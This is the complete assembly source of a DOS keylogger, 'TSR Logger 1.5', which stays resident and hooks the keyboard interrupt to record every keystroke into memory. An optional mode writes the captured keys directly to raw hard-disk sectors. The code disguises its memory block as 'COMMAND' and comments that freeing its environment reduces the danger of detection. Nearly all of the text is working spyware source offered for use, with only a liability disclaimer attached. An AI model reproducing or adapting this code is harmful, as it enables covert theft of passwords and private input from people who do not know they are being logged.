%OUT ******   TSR Logger 1.5 ******
%OUT Author accepts no liability for any damage that may result 
%OUT from using this program or programs that use this source code.

;///    MBR Version of this program uses    ///
;///  UNDOCUMENTED interrupt 28h - DOS Safe ///

.MODEL TINY	; use Tiny model - data, code & stack in one segment
RADIX 10
CODESEG
.386		; we want 32-bit registers
STARTUPCODE	; space for Program Segment Prefix

VersionNum 	equ 	5

true		equ	1
false		equ	0

Debug		equ	false	; Debugging ?
WriteToHDD	equ	false	; Write to disk ?

IF WriteToHDD EQ true
DataSize	equ	2048
ELSE
DataSize	equ	4096
ENDIF

jmp	@Start		; jump to initialization code

; {	************************************ }
; {     *************   Int09 ************** }
; {	************************************ }
 DataIndex	dw	0
 Logging	db	true

IF WriteToHDD EQ true
WriteKeys	db	0
ENDIF

@Int9:	push	ax

    in	al, 60h
    pushf			; simulate INT CALL
    db	09Ah		; { Far CALL }
Orig9	dd	0
    cmp	cs:Logging, false ; is logging enabled ?
    je	@IRet
    test	al, 80h		; *** keypressed ?
    jnz	@IRet			; (release=+080h;Extcode=0E0h)
    push	bx si ds

    push	cs
    pop	ds
    mov	bx, offset @KeyData	; add key code
    mov	si, dataIndex
    mov	[si+bx], al
    inc	DataIndex
IF WriteToHDD EQ true
    cmp	[si+bx-1], al		; don't write to disk when ...
    je	@Test9			; ... same key(Enter) is pressed 2x
    cmp	al, 1Ch			; write to disk ?
    jne	@Test9			; ...Nope
    mov	WriteKeys, 1
    jmp	@Pop9
ENDIF
@Test9:	cmp	DataIndex, DataSize	; *** overflow
    jb	@Pop9
    mov	DataIndex, 0
    mov	Logging, false
@Pop9:	pop	ds si bx

@IRet:	pop	ax
    iret

; {	*********************************** }
; {     ************* Int28 *************** }
; {	*********************************** }
IF WriteToHDD EQ true
@Int28:
    cmp	cs:WriteKeys, 0
    je	@Jmp28
@My28:	push	es ax cx dx bx
    push	cs
    pop	es		; buffer
    mov	bx, offset @KeyData
    mov	ax, 0304h	; Func Number / Sector Count
    mov	cx, 0002h	; Track(0) / Sector(2)
    mov	dx, 0080h	; Head / Drive
    mov	cs:WriteKeys, 0
    int	13h

IF Debug NE false
    push	0B800h
    pop	es
    mov	byte ptr es:[9Eh], 'o'
    jnc	@NoError
    mov	byte ptr es:[9Eh], 'e'
@NoError:
ENDIF
    pop	bx dx cx ax es
@Jmp28:	db	0EAh		; { Far JMP }
Orig28	dd	0
ENDIF

; {	*********************************** }
; {     *************   Int2F ************* }
; {	*********************************** }
@Int2F:	cmp	eax,	4E545005h
    je	@My2F
    db	0EAh		; { Far JMP }
Orig2F	dd	0
@My2F:	mov	bx, offset @KeyData	; es:bx - keydata
    mov	ax, cs
    mov	es, ax
    mov	si, offset Logging	; dx:si - EnableWriting
    mov	ax, 45h + (VersionNum shl 8) ; version
    iret
; { ****************************************************************** }
; { ****** Interrupt procedure Installation  - Main Program ********** }
; { ****************************************************************** }
@KeyData:
    rep	stosd

; { *** Make program resident *** }
    mov	ax, 3103h       	; AL = errorlevel
    mov	dx, offset @KeyData + DataSize + 16
    shr	dx, 4

    sti

    int	21h			; Keep

    retn		; not required, but...	

@Start:	
    mov	ah, 9
    mov	dx, offset ProgName
    int	21h			; { Print Info }
; { *** CPU testing *** }
    push	sp		; 8086 test
    pop	ax
    cmp	ax, sp
    jne	@No386
    mov	ax, 0FFFFh	; 286 test
    mov	cl, 20h
    shl	ax, cl
    or	ax, ax
    jnz	@386
@No386:	mov	ah, 9		; No 386 processor
    mov	dx, offset NoCPU
    int	21h
    retn
@386:

; { *** Looking for previous installations *** }
    mov	eax, 4E545005h			; { Installed ? ... }
    int	2Fh
    cmp	al, 45h
    jne	@NotInstalled
    mov	ah, 9				; { ... Yes }
    mov	dx, offset Installed
    int	21h
    retn
@NotInstalled:					; { ... No }

; { *** Environment deallocation *** }
; { saves about 200 bytes of memory }
; { and reduces danger of detection }
    mov	es, cs:[02Ch]		; { Deallocate environment }
    mov	ah, 49h
    int	21h
    jnc	@DeallocationOk		; { can't deallocate Env. } 
    mov	ah, 9
    mov	dx, offset MemError
    int	21h			; never mind
@DeallocationOk:

; { *** Is enough memory ? *** }
;	mov	ax, cs:[06h]	; this method doesn't work for UMB
;	cmp	ax, DataSize + offset @Keydata	; ignore size of PSP

    cmp	sp, DataSize + offset @Keydata + 128

    ja	@MemoryOk
    mov	ah, 9
    mov	dx, offset NoMemory
    int	21h
    retn
@MemoryOk:

; { *** Print message *** }
    mov	ah, 9
    mov	dx, offset InstallSuccess
    int	21h

    cli		; no IRQs from now on

; { *** Fake MCB *** }
; { pretty nice code }
    mov	ax, cs
    dec	ax
    mov	es, ax
    mov	di, 8
    mov	si, offset Fake
    mov	cx, 4
    cld
    rep	movsw


; { *** Writing interrupt vectors *** }
    xor	ax, ax					;{ GetIntVec }
    mov	es, ax
    mov	eax, es:[4 * 09h] ; interrupt hooked by program
    mov	Orig9, Eax
    mov	eax, es:[4 * 2Fh] ; Multiplex interrupt
    mov	Orig2F, Eax
IF WriteToHDD EQ true
    mov	eax, es:[4 * 28h] ; DOSSave interrupt
    mov	Orig28, Eax
ENDIF
    mov	word ptr es:[4 * 09h], offset @Int9	;{ SetIntVec }
    mov	es:[4 * 09h + 2], cs
    mov	word ptr es:[4 * 2Fh], offset @Int2F
    mov	es:[4* 2Fh + 2], cs
IF WriteToHDD EQ true
    mov	word ptr es:[4 * 28h], offset @Int28
    mov	es:[4* 28h + 2], cs
ENDIF

; { *** Clear area for keys *** }
    push	cs
    pop	es
    mov	di, offset @Start
    mov	cx, DataSize / 4
    mov	eax, 39393939h
    cld

    jmp	@KeyData

 Fake		db	"COMMAND",0
 Installed	db	"Logger already installed.",0Ah,0Dh,"$"
 InstallSuccess	db	"Successfully installed.",0Ah, 0Dh,"$"
 MemError	db	"Can't deallocate environment.",0Ah,0Dh,"$"
 NoCPU		db	"This program requires 80386 CPU.",0Ah,0Dh,"$"
 NoMemory	db	"Not enough memory to install Logger!!!",0Dh,0Ah,"$"
 ProgName	db	"TSR Logger 1.",'0'+VersionNum
IF WriteToHDD EQ false
 ProgMemOnly	db	" mem-only"
ELSE
IF Debug EQ true
 ProgDebug	db	" debug"
ENDIF
ENDIF
 ProgNameEnd	db	0Ah,0Dh,0Ah,0Dh,"$"

END
